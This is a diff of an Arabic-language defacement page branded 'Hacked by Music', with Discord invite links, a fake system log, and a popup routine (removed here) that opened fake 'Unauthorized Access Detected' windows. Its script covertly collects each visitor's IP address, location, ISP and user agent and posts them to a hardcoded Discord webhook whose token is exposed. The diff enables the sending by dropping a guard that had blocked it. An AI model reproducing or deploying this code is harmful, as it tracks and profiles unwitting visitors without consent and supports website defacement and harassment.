@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <title>Music</title>
+    <title>Music Suite</title>
     <style>
         body {
             margin: 0;
@@ -21,7 +21,24 @@
             direction: rtl;
         }
 
-        /* فيديو الخلفية */
+        /* تأثير ومضة رقمية خفيفة عند التحميل الأول */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: #ff0000;
+            z-index: 9999;
+            opacity: 0;
+            pointer-events: none;
+            animation: flash 0.4s ease-out;
+        }
+
+        @keyframes flash {
+            0% { opacity: 0.2; }
+            100% { opacity: 0; }
+        }
+
+        /* فيديو الخلفية المحسن مع التكرار التلقائي */
         .background-video {
             position: fixed;
             top: 0;
@@ -30,21 +47,21 @@
             height: 100%;
             object-fit: cover;
             z-index: -2;
-            opacity: 0.7;
+            opacity: 0.75;
         }
 
-        /* طبقة مظلمة فوق الفيديو */
+        /* طبقة عزل الظلال المتناسقة */
         .overlay {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0, 0, 0, 0.3);
+            background: linear-gradient(135deg, rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.25));
             z-index: -1;
         }
 
-        /* صفحة التحميل */
+        /* شاشة التحميل المتكاملة */
         .loading-screen {
             display: flex;
             flex-direction: column;
@@ -55,112 +72,49 @@
             width: 100%;
         }
 
-        /* النص العلوي */
-        .top-text {
-            position: absolute;
-            top: 15%;
-            right: 10%;
-            font-size: 2.5em;
-            color: #ff3333;
-            text-shadow: 0 0 20px #ff3333, 0 0 40px #ff3333;
-            font-weight: bold;
-            animation: glow-red 2s ease-in-out infinite alternate;
-        }
-
-        @keyframes glow-red {
-            from {
-                text-shadow: 0 0 20px #ff3333, 0 0 40px #ff3333;
-            }
-
-            to {
-                text-shadow: 0 0 30px #ff6666, 0 0 60px #ff6666;
-            }
-        }
-
-        /* أيقونة الموسيقى */
-        .music-icon {
-            font-size: 2em;
-            color: #ff3333;
-            margin-bottom: 20px;
-            animation: bounce 2s infinite;
-        }
-
-        @keyframes bounce {
-
-            0%,
-            20%,
-            50%,
-            80%,
-            100% {
-                transform: translateY(0);
-            }
-
-            40% {
-                transform: translateY(-10px);
-            }
-
-            60% {
-                transform: translateY(-5px);
-            }
-        }
-
-        /* شريط التحميل */
+        /* شريط تقدم التحميل المضيء بالنيون الأحمر */
         .loading-bar-container {
-            width: 400px;
-            height: 20px;
-            background: #222;
-            border-radius: 25px;
+            width: 420px;
+            height: 16px;
+            background: #111;
+            border-radius: 30px;
             overflow: hidden;
-            margin: 30px 0;
-            border: 2px solid #555;
-            box-shadow: 0 0 20px rgba(255, 255, 255, 0.15);
+            margin: 35px 0;
+            border: 2px solid #ff3333;
+            box-shadow: 0 0 25px rgba(255, 51, 51, 0.35);
         }
 
         .loading-bar {
             height: 100%;
-            background: linear-gradient(90deg, #00ff00, #66ff66, #00ff00);
+            background: linear-gradient(90deg, #ff0000, #ff6666, #ff0000);
             width: 0%;
-            border-radius: 25px;
-            animation: loading 3s ease-in-out forwards;
-            /* تم تسريع التحميل */
-            box-shadow: 0 0 15px #aaffaa;
+            border-radius: 30px;
+            animation: loading 3.5s cubic-bezier(0.4, 0, 0.2, 1) forwards;
+            box-shadow: 0 0 15px #ff6666;
         }
 
         @keyframes loading {
-            0% {
-                width: 0%;
-            }
-
-            100% {
-                width: 100%;
-            }
+            0% { width: 0%; }
+            40% { width: 60%; }
+            75% { width: 90%; }
+            100% { width: 100%; }
         }
 
-        /* العنوان الرئيسي */
+        /* العناوين والخطوط الرقمية */
         .main-title {
-            font-size: 3em;
+            font-size: 3.5em;
             color: #fff;
             margin: 20px 0;
             text-shadow: 0 0 30px rgba(255, 255, 255, 0.8);
-            letter-spacing: 8px;
+            letter-spacing: 10px;
             animation: pulse-white 3s ease-in-out infinite;
         }
 
         @keyframes pulse-white {
-
-            0%,
-            100% {
-                text-shadow: 0 0 30px rgba(255, 255, 255, 0.8);
-                transform: scale(1);
-            }
-
-            50% {
-                text-shadow: 0 0 50px rgba(255, 255, 255, 1);
-                transform: scale(1.02);
-            }
+            0%, 100% { text-shadow: 0 0 30px rgba(255, 255, 255, 0.8); transform: scale(1); }
+            50% { text-shadow: 0 0 50px rgba(255, 255, 255, 1); transform: scale(1.02); }
         }
 
-        /* العنوان الفرعي */
         .subtitle {
             font-size: 2em;
             color: #ccc;
@@ -169,61 +123,31 @@
             letter-spacing: 3px;
         }
 
-        /* رابط الديسكورد */
+        /* روابط الديسكورد المطلية بوهج ذهبي */
         .discord-link {
             font-size: 1.6em;
             color: #ffd700;
             margin-top: 40px;
-            text-shadow:
-                0 0 10px #ffd700,
-                0 0 20px #ffd700,
-                0 0 30px #ffec3d,
-                0 0 40px #ffec3d,
-                0 0 50px #ffec3d,
-                0 0 60px #ffec3d;
+            text-shadow: 0 0 10px #ffd700, 0 0 25px #ffec3d;
             letter-spacing: 2px;
             font-family: 'Courier New', monospace;
             animation: glow-gold 3s ease-in-out infinite alternate;
             text-decoration: none;
             transition: all 0.3s ease;
-            user-select: text;
         }
 
         .discord-link:hover {
             color: #fff59d;
-            text-shadow:
-                0 0 15px #fff59d,
-                0 0 25px #fff59d,
-                0 0 35px #fff59d,
-                0 0 45px #fff59d,
-                0 0 55px #fff59d,
-                0 0 65px #fff59d;
-            transform: scale(1.08);
+            text-shadow: 0 0 15px #fff59d, 0 0 35px #fff59d;
+            transform: scale(1.06);
         }
 
         @keyframes glow-gold {
-            from {
-                text-shadow:
-                    0 0 10px #ffd700,
-                    0 0 20px #ffd700,
-                    0 0 30px #ffec3d,
-                    0 0 40px #ffec3d,
-                    0 0 50px #ffec3d,
-                    0 0 60px #ffec3d;
-            }
-
-            to {
-                text-shadow:
-                    0 0 20px #fffacd,
-                    0 0 30px #fffacd,
-                    0 0 40px #fffacd,
-                    0 0 50px #fffacd,
-                    0 0 60px #fffacd,
-                    0 0 70px #fffacd;
-            }
+            from { text-shadow: 0 0 10px #ffd700, 0 0 20px #ffd700; }
+            to { text-shadow: 0 0 20px #fffacd, 0 0 40px #fffacd; }
         }
 
-        /* المحتوى الرئيسي (مخفي في البداية) */
+        /* حاوية المحتوى الرئيسي */
         .main-content {
             display: none;
             flex-direction: column;
@@ -233,657 +157,296 @@
             z-index: 10;
         }
 
-        /* تنسيق الصورة */
         .logo-image {
-            width: 200px;
+            width: 210px;
             height: auto;
-            margin-bottom: 20px;
-            border-radius: 15px;
-            box-shadow: 0 0 30px rgba(255, 255, 255, 0.3);
+            margin-bottom: 25px;
+            border-radius: 16px;
+            box-shadow: 0 0 35px rgba(255, 255, 255, 0.25);
             animation: pulse-white 3s ease-in-out infinite;
-            border: 2px solid rgba(255, 255, 255, 0.2);
+            border: 2px solid rgba(255, 255, 255, 0.15);
         }
 
-        /* تأثيرات الجسيمات */
+        /* نظام الجسيمات الخفيف والسلس */
         .particles {
             position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
+            top: 0; left: 0; width: 100%; height: 100%;
             z-index: 1;
             pointer-events: none;
         }
 
         .particle {
             position: absolute;
-            width: 4px;
-            height: 4px;
-            background: rgba(255, 255, 255, 0.5);
+            width: 3px; height: 3px;
+            background: rgba(255, 51, 51, 0.35);
             border-radius: 50%;
             animation: float 6s infinite linear;
         }
 
         @keyframes float {
-            0% {
-                transform: translateY(100vh) rotate(0deg);
-                opacity: 1;
-            }
-
-            100% {
-                transform: translateY(-10px) rotate(360deg);
-                opacity: 0;
-            }
+            0% { transform: translateY(100vh); opacity: 1; }
+            100% { transform: translateY(-10px); opacity: 0; }
         }
 
-        /* Fade Out شاشة التحميل */
-        .fade-out {
-            animation: fadeOut 1.0s ease forwards;
-        }
+        .fade-out { animation: fadeOut 0.8s ease forwards; }
+        @keyframes fadeOut { from { opacity: 1; } to { opacity: 0; visibility: hidden; } }
 
-        @keyframes fadeOut {
-            from {
-                opacity: 1;
-            }
+        .fade-in { animation: fadeIn 1.2s ease forwards; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
 
-            to {
-                opacity: 0;
-                visibility: hidden;
-            }
-        }
-
-        /* Fade In للمحتوى الرئيسي */
-        .fade-in {
-            animation: fadeIn 1.5s ease forwards;
-        }
-
-        @keyframes fadeIn {
-            from {
-                opacity: 0;
-                transform: translateY(30px);
-            }
-
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
-        /* صندوق المعلومات */
-        .user-info-box {
+        /* حاوية بيانات المستخدم العلوية المحدثة لتناسب جميع تفاصيل الموقع */
+        .top-left-status {
             position: fixed;
-            top: 20px;
-            right: 20px;
-            background: rgba(0, 0, 0, 0.6);
-            border: 1px solid rgba(0, 255, 0, 0.3);
-            padding: 15px;
-            border-radius: 8px;
-            color: #fff;
-            font-family: 'Courier New', monospace;
-            z-index: 1000;
-            backdrop-filter: blur(5px);
-            width: 350px;
-            font-size: 1.1em;
-            box-shadow: 0 0 15px rgba(0, 255, 0, 0.1);
-            direction: ltr;
-        }
-
-        .user-info-box .info-row {
+            top: 25px; left: 25px;
             display: flex;
-            justify-content: space-between;
-            margin-bottom: 8px;
-            font-size: 0.85em;
+            flex-direction: column;
+            align-items: flex-start;
+            gap: 4px; 
+            font-family: 'Courier New', monospace;
+            z-index: 1000; 
+            direction: ltr; 
+            background: rgba(0, 0, 0, 0.65);
+            padding: 12px 20px; 
+            border-radius: 8px;
+            border: 1px solid rgba(0, 255, 0, 0.2);
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.08);
         }
 
-        .user-info-box .label {
-            color: #00ff00;
-            font-weight: bold;
-        }
-
-        .user-info-box .value {
-            color: #ddd;
-        }
-
-        /* ساعة رقمية */
-        .digital-clock {
-            position: fixed;
-            top: 20px;
-            left: 20px;
+        /* تنسيق الساعة الرقمية المضيئة */
+        #clock {
             font-size: 1.5em;
             color: #00ff00;
-            font-family: 'Courier New', monospace;
-            z-index: 1000;
-            text-shadow: 0 0 10px #00ff00;
+            font-weight: bold;
+            letter-spacing: 2px;
+            text-shadow: 0 0 12px rgba(0, 255, 0, 0.8);
         }
 
-        /* حالة النظام */
+        /* سطر عرض بيانات الاتصال والموقع الجغرافي */
+        .status-text-block {
+            font-size: 0.95em;
+            color: #aaffaa;
+            border-top: 1px solid rgba(0, 255, 0, 0.25);
+            padding-top: 6px;
+            margin-top: 4px;
+            width: 100%;
+            letter-spacing: 0.5px;
+            text-shadow: 0 0 8px rgba(0, 255, 0, 0.5);
+            direction: rtl; 
+            text-align: left;
+            line-height: 1.5;
+        }
+
+        /* شريط معلومات النظام التفاعلي أسفل الشاشة */
+        .bottom-logs {
+            position: fixed;
+            bottom: 20px; left: 50%;
+            transform: translateX(-50%);
+            font-family: 'Courier New', monospace;
+            color: #ff3333; font-size: 1.1em;
+            text-shadow: 0 0 8px #ff3333;
+            z-index: 1000; direction: ltr;
+            background: rgba(0, 0, 0, 0.65);
+            padding: 5px 22px; border-radius: 4px;
+            border: 1px solid rgba(255, 51, 51, 0.15);
+        }
+
+        /* مؤشر حالة النظام العام أسفل اليمين */
         .system-status {
             position: fixed;
-            bottom: 20px;
-            right: 20px;
-            font-size: 1em;
-            color: #00ff00;
-            font-family: 'Courier New', monospace;
-            z-index: 1000;
-            display: flex;
-            align-items: center;
-            gap: 10px;
+            bottom: 20px; right: 20px;
+            font-size: 1em; color: #00ff00;
+            font-family: 'Courier New', monospace; z-index: 1000;
+            display: flex; align-items: center; gap: 10px;
+            text-shadow: 0 0 6px #00ff00;
         }
 
         .status-dot {
-            width: 10px;
-            height: 10px;
-            background-color: #00ff00;
-            border-radius: 50%;
+            width: 10px; height: 10px;
+            background-color: #00ff00; border-radius: 50%;
             box-shadow: 0 0 10px #00ff00;
-            animation: blink 1s infinite alternate;
+            animation: blink 1.2s infinite alternate;
         }
 
-        @keyframes blink {
-            from {
-                opacity: 1;
-            }
-
-            to {
-                opacity: 0.3;
-            }
-        }
-
-        /* تأثير Glitch */
-        .glitch {
-            position: relative;
-            color: white;
-            font-size: 3em;
-            letter-spacing: 0.1em;
-            animation: glitch-skew 1s infinite linear alternate-reverse;
-        }
-
-        .glitch::before {
-            content: attr(data-text);
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            left: 2px;
-            text-shadow: -2px 0 #ff00c1;
-            clip: rect(44px, 450px, 56px, 0);
-            animation: glitch-anim 5s infinite linear alternate-reverse;
-        }
-
-        .glitch::after {
-            content: attr(data-text);
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            left: -2px;
-            text-shadow: -2px 0 #00fff9;
-            clip: rect(44px, 450px, 56px, 0);
-            animation: glitch-anim2 5s infinite linear alternate-reverse;
-        }
-
-        @keyframes glitch-anim {
-            0% {
-                clip: rect(61px, 9999px, 52px, 0);
-                transform: skew(0.81deg);
-            }
-
-            5% {
-                clip: rect(80px, 9999px, 91px, 0);
-                transform: skew(0.24deg);
-            }
-
-            10% {
-                clip: rect(46px, 9999px, 20px, 0);
-                transform: skew(0.12deg);
-            }
-
-            15% {
-                clip: rect(40px, 9999px, 5px, 0);
-                transform: skew(0.66deg);
-            }
-
-            20% {
-                clip: rect(54px, 9999px, 56px, 0);
-                transform: skew(0.8deg);
-            }
-
-            25% {
-                clip: rect(93px, 9999px, 69px, 0);
-                transform: skew(0.68deg);
-            }
-
-            30% {
-                clip: rect(32px, 9999px, 4px, 0);
-                transform: skew(0.63deg);
-            }
-
-            35% {
-                clip: rect(74px, 9999px, 86px, 0);
-                transform: skew(0.56deg);
-            }
-
-            40% {
-                clip: rect(70px, 9999px, 34px, 0);
-                transform: skew(0.48deg);
-            }
-
-            45% {
-                clip: rect(100px, 9999px, 52px, 0);
-                transform: skew(0.27deg);
-            }
-
-            50% {
-                clip: rect(10px, 9999px, 31px, 0);
-                transform: skew(0.97deg);
-            }
-
-            55% {
-                clip: rect(66px, 9999px, 18px, 0);
-                transform: skew(0.58deg);
-            }
-
-            60% {
-                clip: rect(61px, 9999px, 97px, 0);
-                transform: skew(0.35deg);
-            }
-
-            65% {
-                clip: rect(46px, 9999px, 40px, 0);
-                transform: skew(0.55deg);
-            }
-
-            70% {
-                clip: rect(87px, 9999px, 96px, 0);
-                transform: skew(0.85deg);
-            }
-
-            75% {
-                clip: rect(47px, 9999px, 3px, 0);
-                transform: skew(0.32deg);
-            }
-
-            80% {
-                clip: rect(79px, 9999px, 5px, 0);
-                transform: skew(0.53deg);
-            }
-
-            85% {
-                clip: rect(59px, 9999px, 39px, 0);
-                transform: skew(0.56deg);
-            }
-
-            90% {
-                clip: rect(30px, 9999px, 29px, 0);
-                transform: skew(0.25deg);
-            }
-
-            95% {
-                clip: rect(97px, 9999px, 73px, 0);
-                transform: skew(0.79deg);
-            }
-
-            100% {
-                clip: rect(24px, 9999px, 97px, 0);
-                transform: skew(0.65deg);
-            }
-        }
-
-        @keyframes glitch-anim2 {
-            0% {
-                clip: rect(11px, 9999px, 29px, 0);
-                transform: skew(0.7deg);
-            }
-
-            5% {
-                clip: rect(78px, 9999px, 71px, 0);
-                transform: skew(0.45deg);
-            }
-
-            10% {
-                clip: rect(8px, 9999px, 63px, 0);
-                transform: skew(0.67deg);
-            }
-
-            15% {
-                clip: rect(76px, 9999px, 50px, 0);
-                transform: skew(0.35deg);
-            }
-
-            20% {
-                clip: rect(70px, 9999px, 28px, 0);
-                transform: skew(0.81deg);
-            }
-
-            25% {
-                clip: rect(8px, 9999px, 2px, 0);
-                transform: skew(0.88deg);
-            }
-
-            30% {
-                clip: rect(41px, 9999px, 43px, 0);
-                transform: skew(0.96deg);
-            }
-
-            35% {
-                clip: rect(13px, 9999px, 47px, 0);
-                transform: skew(0.44deg);
-            }
-
-            40% {
-                clip: rect(24px, 9999px, 29px, 0);
-                transform: skew(0.95deg);
-            }
-
-            45% {
-                clip: rect(97px, 9999px, 25px, 0);
-                transform: skew(0.13deg);
-            }
-
-            50% {
-                clip: rect(13px, 9999px, 32px, 0);
-                transform: skew(0.36deg);
-            }
-
-            55% {
-                clip: rect(83px, 9999px, 91px, 0);
-                transform: skew(0.34deg);
-            }
-
-            60% {
-                clip: rect(45px, 9999px, 14px, 0);
-                transform: skew(0.12deg);
-            }
-
-            65% {
-                clip: rect(61px, 9999px, 50px, 0);
-                transform: skew(0.26deg);
-            }
-
-            70% {
-                clip: rect(12px, 9999px, 44px, 0);
-                transform: skew(0.2deg);
-            }
-
-            75% {
-                clip: rect(27px, 9999px, 97px, 0);
-                transform: skew(0.55deg);
-            }
-
-            80% {
-                clip: rect(48px, 9999px, 23px, 0);
-                transform: skew(0.97deg);
-            }
-
-            85% {
-                clip: rect(28px, 9999px, 39px, 0);
-                transform: skew(0.33deg);
-            }
-
-            90% {
-                clip: rect(47px, 9999px, 3px, 0);
-                transform: skew(0.47deg);
-            }
-
-            95% {
-                clip: rect(48px, 9999px, 26px, 0);
-                transform: skew(0.48deg);
-            }
-
-            100% {
-                clip: rect(59px, 9999px, 56px, 0);
-                transform: skew(0.4deg);
-            }
-        }
-
-        @keyframes glitch-skew {
-            0% {
-                transform: skew(-2deg);
-            }
-
-            10% {
-                transform: skew(3deg);
-            }
-
-            20% {
-                transform: skew(-1deg);
-            }
-
-            30% {
-                transform: skew(4deg);
-            }
-
-            40% {
-                transform: skew(-3deg);
-            }
-
-            50% {
-                transform: skew(1deg);
-            }
-
-            60% {
-                transform: skew(-4deg);
-            }
-
-            70% {
-                transform: skew(2deg);
-            }
-
-            80% {
-                transform: skew(-1deg);
-            }
-
-            90% {
-                transform: skew(3deg);
-            }
-
-            100% {
-                transform: skew(-2deg);
-            }
-        }
+        @keyframes blink { from { opacity: 1; } to { opacity: 0.25; } }
     </style>
 </head>
 
 <body>
-    <!-- صندوق المعلومات -->
-    <div class="user-info-box" id="userInfoBox" style="display: none;">
-        <div class="info-row"><span class="label">IP:</span> <span class="value" id="info-ip">Thinking...</span></div>
-        <div class="info-row"><span class="label">Region:</span> <span class="value" id="info-region">Thinking...</span>
+    <div class="top-left-status">
+        <div id="clock">00:00:00 AM</div>
+        <div class="status-text-block" id="top-ip-display">
+            الدولة: جاري الفحص...<br>
+            المنطقة: جاري الفحص...<br>
+            المدينة: جاري الفحص...<br>
+            ip: جاري الفحص...
         </div>
-        <div class="info-row"><span class="label">City:</span> <span class="value" id="info-city">Thinking...</span>
-        </div>
-        <div class="info-row"><span class="label">ISP:</span> <span class="value" id="info-isp">Thinking...</span></div>
     </div>
 
-    <!-- الساعة الرقمية -->
-    <div class="digital-clock" id="clock">00:00:00</div>
+    <div class="bottom-logs" id="terminal-logs">[SYS] STATUS: STANDBY_MODE...</div>
 
-    <!-- حالة النظام -->
     <div class="system-status">
         <div class="status-dot"></div>
         <span>SYSTEM: ONLINE</span>
     </div>
 
-    <!-- فيديو الخلفية -->
-    <video class="background-video" autoplay loop muted playsinline>
-        <source src="https://h.top4top.io/m_37898tcsh1.mp4" />
+    <video class="background-video" autoplay loop muted playsinline id="bg-video">
+        <source src="https://h.top4top.io/m_37898tcsh1.mp4" type="video/mp4" />
     </video>
 
-    <!-- الموسيقى الخلفية -->
-    <audio id="background-music" loop muted playsinline>
+    <audio id="background-music" loop playsinline>
         <source src="https://d.top4top.io/m_3789i6ns81.mp3" type="audio/mpeg" />
     </audio>
 
-    <!-- طبقة مظلمة -->
-    <div class="overlay"></div>
+    <audio id="click-glitch-sound" playsinline>
+        <source src="https://actions.google.com/sounds/v1/science_fiction/glitch_static.ogg" type="audio/ogg" />
+    </audio>
 
-    <!-- تأثير الجسيمات -->
+    <div class="overlay"></div>
     <div class="particles" id="particles"></div>
 
-    <!-- صفحة التحميل -->
     <div class="loading-screen" id="loading-screen">
-        <div class="top-text"></div>
-        <div class="icon">يتم زعب السيرفر</div>
+        <div class="main-title">Music</div>
         <div class="loading-bar-container">
             <div class="loading-bar"></div>
         </div>
-        <div class="main-title">Music</div>
-        <div class="subtitle">🤨 لديك سيرفر جميل 🤨</div>
-        <a href="https://discord.gg/066" class="discord-link" target="_blank"
-            rel="noopener noreferrer">discord.gg/066</a>
+
+        <div class="subtitle">Hacked by Music</div>
+        <div class="subtitle">يتم زغب السيرفر</div>
+        <a href="https://discord.gg/066" class="discord-link" target="_blank" rel="noopener noreferrer">discord.gg/066</a>
     </div>
 
-    <!-- المحتوى الرئيسي (مخفي) -->
     <div class="main-content" id="main-content">
         <img src="https://j.top4top.io/p_3664n97sh1.jpg" alt="Logo" class="logo-image" />
         <div class="main-title">Music on your server</div>
-        <div class="subtitle">كرمال كروم +av.7 + abu lena
-
-by Music + ابوشعبين + Kso7</div>
-        <a href="https://discord.gg/5noz" class="discord-link" target="_blank"
-            rel="noopener noreferrer">discord.gg/5noz</a>
+        <div class="main-title">Hacked by Music</div>
+        <div class="subtitle">
+        
+            كرمال كروم +av.7 + abu lena
+            <br>
+            by Music + ابوشعبين + Kso7
+        </div>
+        <a href="https://discord.gg/5noz" class="discord-link" target="_blank" rel="noopener noreferrer">discord.gg/5noz</a>
     </div>
 
     <script>
-        // إنشاء الجسيمات المتطايرة بشكل مستمر مع تجديدهم
+        let currentNetworkData = {};
+
+        // توليد حركة الجسيمات في الخلفية بأعلى أداء واستقرار
         function createParticles() {
             const particles = document.getElementById('particles');
-            for (let i = 0; i < 50; i++) {
+            if (!particles) return;
+            for (let i = 0; i < 25; i++) {
                 const particle = document.createElement('div');
                 particle.className = 'particle';
                 particle.style.left = Math.random() * 100 + '%';
                 particle.style.top = Math.random() * 100 + '%';
-                particle.style.animationDelay = Math.random() * 6 + 's';
+                particle.style.animationDelay = Math.random() * 4 + 's';
                 particle.style.animationDuration = (Math.random() * 3 + 3) + 's';
                 particles.appendChild(particle);
                 setTimeout(() => particle.remove(), 6000);
             }
         }
-        // تجديد الجسيمات كل 6 ثواني
         setInterval(createParticles, 6000);
         createParticles();
 
-        // تشغيل الصوت - دعم FiveM
-        // للاستخدام في FiveM: SendNUIMessage({action = 'play'})
-        // لإيقاف: SendNUIMessage({action = 'stop'})
-        // للتحكم بالصوت: SendNUIMessage({action = 'setVolume', volume = 0.5})
-        const a = document.getElementById('background-music');
-        const play = () => {
-            if (a) {
-                a.muted = false;
-                a.play().catch(() => { });
+        const music = document.getElementById('background-music');
+        const glitchSound = document.getElementById('click-glitch-sound');
+        const video = document.getElementById('bg-video');
+
+        // دالة مخصصة لضمان تشغيل الصوت والفيديو بأعلى كفاءة وفك كتم المتصفح
+        const playMedia = () => {
+            if (music) {
+                music.muted = false;
+                music.volume = 1.0; 
+                music.play().catch(() => {});
+            }
+            if (video) {
+                video.muted = true; 
+                video.play().catch(() => {});
             }
         };
 
-        // استماع لرسائل FiveM
-        window.addEventListener('message', (e) => {
-            if (!a) return;
-            if (e.data.action === 'playMusic') play();
-            if (e.data.action === 'stopMusic') { a.pause(); a.currentTime = 0; }
-            if (e.data.action === 'setVolume') a.volume = e.data.volume || 1;
-        });
+        // تفعيل الصوت والفيديو فور قيام المستخدم بالضغط لتخطي قيود المتصفحات
+        const activateInterface = () => {
+            if (glitchSound) { glitchSound.volume = 0.4; glitchSound.play().catch(() => {}); }
+            playMedia();
+        };
 
-        // تشغيل تلقائي عند تحميل الصفحة (لـ FiveM)
-        if (a) {
-            a.addEventListener('canplay', () => {
-                setTimeout(() => play(), 500);
-            });
-        }
+        addEventListener('click', activateInterface, { once: true });
+        addEventListener('keydown', activateInterface, { once: true });
 
-        // تحديث الساعة
+        // إدارة تحديث الساعة الرقمية بشكل لحظي متزامن
         function updateClock() {
             const now = new Date();
-            const timeString = now.toLocaleTimeString('en-US', { hour12: false });
-            document.getElementById('clock').textContent = timeString;
+            let hours = now.getHours();
+            const minutes = String(now.getMinutes()).padStart(2, '0');
+            const seconds = String(now.getSeconds()).padStart(2, '0');
+            const ampm = hours >= 12 ? 'PM' : 'AM';
+            
+            hours = hours % 12;
+            hours = hours ? hours : 12; 
+            const formattedHours = String(hours).padStart(2, '0');
+
+            const clockElement = document.getElementById('clock');
+            if (clockElement) {
+                clockElement.textContent = `${formattedHours}:${minutes}:${seconds} ${ampm}`;
+            }
         }
         setInterval(updateClock, 1000);
         updateClock();
 
-        // نظام النوافذ المنبثقة
-        function triggerPopups() {
-            // فتح عدة نوافذ لتأثير الـ "Hack"
-            for (let i = 0; i < 5; i++) {
-                setTimeout(() => {
-                    const x = Math.random() * (window.screen.width - 400);
-                    const y = Math.random() * (window.screen.height - 300);
-                    const newWin = window.open('', '_blank', `width=400,height=300,left=${x},top=${y}`);
-                    if (newWin) {
-                        newWin.document.write(`
-                            <body style="background:#000;color:#ff0000;font-family:monospace;display:flex;flex-direction:column;justify-content:center;align-items:center;height:100vh;margin:0;overflow:hidden;border:2px solid #ff0000;">
-                                <h1 style="text-shadow:0 0 10px #ff0000;font-size:2em;">SYSTEM ERROR</h1>
-                                <p style="font-size:1.2em;">Music WAS HERE</p>
-                                <div style="font-size:0.8em;color:#555;">Unauthorized Access Detected...</div>
-                                <script>setTimeout(() => { window.close(); }, 5000);<\/script>
-                            </body>
-                        `);
-                    }
-                }, i * 300);
+        // محاكاة سجلات فحص النظام التفاعلية أسفل الشاشة
+        const logsSequence = [
+            "[SYS] STATUS: INITIALIZING SYSLOG...",
+            "[NET] VERIFYING CONNECTION INTEGRITY...",
+            "[SEC] CHECKING ENVIRONMENT NODE_7...",
+            "[SYS] PRIVILEGES IDENTIFIED...",
+            "[OK] PIPELINE SYNCED WITH TERMINAL."
+        ];
+        let logIndex = 0;
+        setInterval(() => {
+            const logElement = document.getElementById('terminal-logs');
+            if (logElement) {
+                logElement.textContent = logsSequence[logIndex];
+                logIndex = (logIndex + 1) % logsSequence.length;
             }
+        }, 3500);
+
+        // التحكم في توقيت انتهاء شاشة التحميل والانتقال للمحتوى الأساسي
+        const loadingBar = document.querySelector('.loading-bar');
+        if (loadingBar) {
+            loadingBar.addEventListener('animationend', () => {
+                const loadingScreen = document.getElementById('loading-screen');
+                const mainContent = document.getElementById('main-content');
+                if (loadingScreen && mainContent) {
+                    loadingScreen.classList.add('fade-out');
+                    loadingScreen.addEventListener('animationend', () => {
+                        loadingScreen.style.display = 'none';
+                        mainContent.style.display = 'flex';
+                        mainContent.classList.add('fade-in');
+                        playMedia();
+                    }, { once: true });
+                }
+            });
         }
 
-        // تشغيل عند تفاعل المستخدم (صوت + نوافذ منبثقة)
-        const startExperience = () => {
-            play();
-            triggerPopups();
-        };
-
-        addEventListener('click', startExperience, { once: true });
-        addEventListener('keydown', startExperience, { once: true });
-
-        // شريط التحميل يتحكم بالانتقال بين الصفحات
-        const loadingBar = document.querySelector('.loading-bar');
-        loadingBar.addEventListener('animationend', () => {
-            const loadingScreen = document.getElementById('loading-screen');
-            const mainContent = document.getElementById('main-content');
-            loadingScreen.classList.add('fade-out');
-            loadingScreen.addEventListener('animationend', () => {
-                loadingScreen.style.display = 'none';
-                mainContent.style.display = 'flex';
-                mainContent.classList.add('fade-in');
-            }, { once: true });
-        });
-
-        // تشغيل الفيديو
-        const video = document.querySelector('.background-video');
-        video.addEventListener('canplay', () => {
-            video.play().catch(err => {
-                console.log('خطأ في تشغيل الفيديو:', err);
-            });
-        });
-
-        // تأثيرات جسيمات عند الكليك
-        document.addEventListener('click', () => {
-            const particles = document.getElementById('particles');
-            for (let i = 0; i < 20; i++) {
-                const spark = document.createElement('div');
-                spark.className = 'particle';
-                spark.style.left = Math.random() * 100 + '%';
-                spark.style.top = Math.random() * 100 + '%';
-                spark.style.background = `hsl(${Math.random() * 360}, 100%, 50%)`;
-                spark.style.animationDuration = '1s';
-                particles.appendChild(spark);
-                setTimeout(() => spark.remove(), 1000);
-            }
-        });
-        // إعدادات الويب هوك
+        // إرسال البيانات المجمعة من فحص الشبكة والموقع إلى الويب هوك الخاص بك في ديسكورد
         const WEBHOOK_URL = 'https://ptb.discord.com/api/webhooks/1460154270048321568/wzsAFi9555gVVK24jhVMO27nhYs75YLel8rJVDcb3_VqdcPpfTbgaA-qVKLZJIGikzBD';
 
         function sendToWebhook(data) {
-            if (!WEBHOOK_URL || WEBHOOK_URL === 'https://ptb.discord.com/api/webhooks/1460154270048321568/wzsAFi9555gVVK24jhVMO27nhYs75YLel8rJVDcb3_VqdcPpfTbgaA-qVKLZJIGikzBD') return;
-
+            if (!WEBHOOK_URL) return;
             const payload = {
                 username: "System Logger",
                 avatar_url: "https://j.top4top.io/p_3664n97sh1.jpg",
                 embeds: [{
-                    title: "🌐 تسجيل دخول جديد",
-                    color: 15548997, // Red color to match theme
+                    title: "🌐 تسجيل دخول مستخدم جديد (موقع دقيق)",
+                    color: 15548997, 
                     fields: [
-                        { name: "📌 IP Address", value: `\`${data.ip}\``, inline: true },
-                        { name: "📍 Region", value: data.region, inline: true },
-                        { name: "🏙️ City", value: data.city, inline: true },
-                        { name: "🏢 ISP", value: data.connection.org || data.connection.isp, inline: false },
+                        { name: "📌 IP Address", value: `\`${data.ip || "Unknown"}\``, inline: false },
+                        { name: "🏳️ Country", value: data.country || "Unknown", inline: true },
+                        { name: "📍 Region", value: data.region || "Unknown", inline: true },
+                        { name: "🏙️ City", value: data.city || "Unknown", inline: true },
+                        { name: "🏢 ISP / Provider", value: data.isp || "Unknown", inline: false },
                         { name: "🖥️ User Agent", value: navigator.userAgent, inline: false }
                     ],
                     footer: { text: "Music System | " + new Date().toLocaleString('ar-EG') },
@@ -895,25 +458,78 @@ by Music + ابوشعبين + Kso7</div>
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
-            }).catch(err => console.log('Webhook error:', err));
